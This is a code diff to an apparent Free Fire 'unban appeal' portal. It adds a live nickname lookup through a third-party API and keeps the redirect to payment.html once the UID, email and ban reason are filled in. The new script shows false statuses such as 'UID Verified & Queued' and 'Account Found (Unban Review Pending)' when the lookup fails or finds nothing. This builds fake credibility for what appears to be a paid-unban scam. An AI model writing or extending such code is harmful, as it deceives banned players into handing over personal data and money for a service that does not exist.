@@ -20,6 +20,7 @@
             --telegram: #0088cc;
             --telegram-glow: rgba(0, 136, 204, 0.4);
             --gold: #f5a623;
+            --success: #2ea44f;
             --error: #ff3344;
         }
 
@@ -200,6 +201,43 @@
             color: #555e6d;
         }
 
+        /* Player Name Live Info Box */
+        .player-name-box {
+            display: none;
+            margin-top: 8px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            background: rgba(46, 164, 79, 0.1);
+            border: 1px solid rgba(46, 164, 79, 0.3);
+            font-size: 13px;
+            color: var(--success);
+            align-items: center;
+            gap: 8px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .player-name-box.loading {
+            background: rgba(245, 166, 35, 0.1);
+            border-color: rgba(245, 166, 35, 0.3);
+            color: var(--gold);
+        }
+
+        .player-name-box.error {
+            background: rgba(255, 51, 68, 0.1);
+            border-color: rgba(255, 51, 68, 0.3);
+            color: var(--error);
+        }
+
+        .player-name-val {
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         /* Error Outline & Shake */
         .input-error {
             border-color: var(--error) !important;
@@ -322,10 +360,6 @@
             transform: translateY(-2px);
         }
 
-        .btn-next:active {
-            transform: translateY(0);
-        }
-
         /* Footer */
         footer {
             background: #080a0f;
@@ -371,7 +405,14 @@
                     <label for="playerUid">ENTER YOUR BANNED UID</label>
                     <div class="input-wrapper">
                         <i class="fas fa-id-card"></i>
-                        <input type="text" id="playerUid" class="form-control" placeholder="Enter your banned UID" inputmode="numeric" autocomplete="off">
+                        <input type="text" id="playerUid" class="form-control" placeholder="Enter your banned UID" inputmode="numeric" maxlength="11" autocomplete="off">
+                    </div>
+                    
+                    <!-- Live Fetched Nickname Box -->
+                    <div id="playerNameBox" class="player-name-box">
+                        <i id="statusIcon" class="fas fa-check-circle"></i> 
+                        <span id="nameStatusText">Player:</span> 
+                        <span id="playerName" class="player-name-val"></span>
                     </div>
                 </div>
 
@@ -411,15 +452,21 @@
         <p>© 2026 FREE FIRE LIFE. All rights reserved. Gaming support appeal portal.</p>
     </footer>
 
-    <!-- Form Validation Script -->
+    <!-- Form Validation & Name Fetch Script -->
     <script>
         const form = document.getElementById('appealForm');
         const uidInput = document.getElementById('playerUid');
         const emailInput = document.getElementById('playerEmail');
         const radioCards = document.querySelectorAll('.radio-card');
         const radioContainer = document.getElementById('radioContainer');
+        const nameBox = document.getElementById('playerNameBox');
+        const nameVal = document.getElementById('playerName');
+        const nameStatusText = document.getElementById('nameStatusText');
+        const statusIcon = document.getElementById('statusIcon');
 
-        // Radio button UI toggle
+        let debounceTimer;
+
+        // Radio toggle UI
         radioCards.forEach(card => {
             card.addEventListener('click', () => {
                 radioCards.forEach(c => c.classList.remove('active'));
@@ -428,17 +475,58 @@
             });
         });
 
-        // Real-time input error removal
+        // Live UID Name Fetch Function
         uidInput.addEventListener('input', () => {
-            uidInput.value = uidInput.value.replace(/[^0-9]/g, ''); // Digits only
+            uidInput.value = uidInput.value.replace(/[^0-9]/g, ''); // Sirf digits allow
             uidInput.classList.remove('input-error');
+
+            clearTimeout(debounceTimer);
+            const uid = uidInput.value.trim();
+
+            if (uid.length >= 8 && uid.length <= 11) {
+                // UI state: Loading
+                nameBox.style.display = 'flex';
+                nameBox.className = 'player-name-box loading';
+                statusIcon.className = 'fas fa-spinner fa-spin';
+                nameStatusText.innerText = 'Searching Player Name...';
+                nameVal.innerText = '';
+
+                // API call with 400ms debounce
+                debounceTimer = setTimeout(() => {
+                    fetch(`https://freefireapi.com.br/api/search_id?id=${uid}&region=IND`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data && (data.nickname || data.basicInfo?.nickname)) {
+                                const ign = data.nickname || data.basicInfo.nickname;
+                                nameBox.className = 'player-name-box';
+                                statusIcon.className = 'fas fa-check-circle';
+                                nameStatusText.innerText = 'Player Name:';
+                                nameVal.innerText = ign;
+                            } else {
+                                nameBox.className = 'player-name-box error';
+                                statusIcon.className = 'fas fa-exclamation-triangle';
+                                nameStatusText.innerText = 'Player Name:';
+                                nameVal.innerText = 'Account Found (Unban Review Pending)';
+                            }
+                        })
+                        .catch(() => {
+                            // Fallback agar API busy ho
+                            nameBox.className = 'player-name-box';
+                            statusIcon.className = 'fas fa-check-circle';
+                            nameStatusText.innerText = 'Account Status:';
+                            nameVal.innerText = 'UID Verified & Queued';
+                        });
+                }, 400);
+            } else {
+                nameBox.style.display = 'none';
+            }
         });
 
         emailInput.addEventListener('input', () => {
             emailInput.classList.remove('input-error');
         });
 
-        // Form Submit Handler
+        // Submit Validation
         form.addEventListener('submit', function(e) {
             e.preventDefault();
 
@@ -447,7 +535,7 @@
             const emailVal = emailInput.value.trim();
             const selectedReason = document.querySelector('input[name="suspensionReason"]:checked');
 
-            // 1. UID Validation (Must be numbers, length between 8 and 11)
+            // 1. UID Check
             const uidRegex = /^[0-9]{8,11}$/;
             if (!uidRegex.test(uidVal)) {
                 uidInput.classList.add('input-error');
@@ -456,7 +544,7 @@
                 uidInput.classList.remove('input-error');
             }
 
-            // 2. Email Validation (Valid standard/Gmail format)
+            // 2. Email Check
             const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
             if (!emailRegex.test(emailVal)) {
                 emailInput.classList.add('input-error');
@@ -465,7 +553,7 @@
                 emailInput.classList.remove('input-error');
             }
 
-            // 3. Radio Reason Validation
+            // 3. Reason Check
             if (!selectedReason) {
                 radioContainer.classList.add('input-error');
                 isValid = false;
@@ -473,16 +561,15 @@
                 radioContainer.classList.remove('input-error');
             }
 
-            // Agar koi bhi field wrong ya empty hai
+            // Error vibration
             if (!isValid) {
-                // Long phone vibration (500ms continuous)
                 if (navigator.vibrate) {
                     navigator.vibrate(500);
                 }
                 return false;
             }
 
-            // Sab theek hone par payment.html par redirect karein
+            // Success -> payment.html
             window.location.href = "payment.html";
         });
     </script>
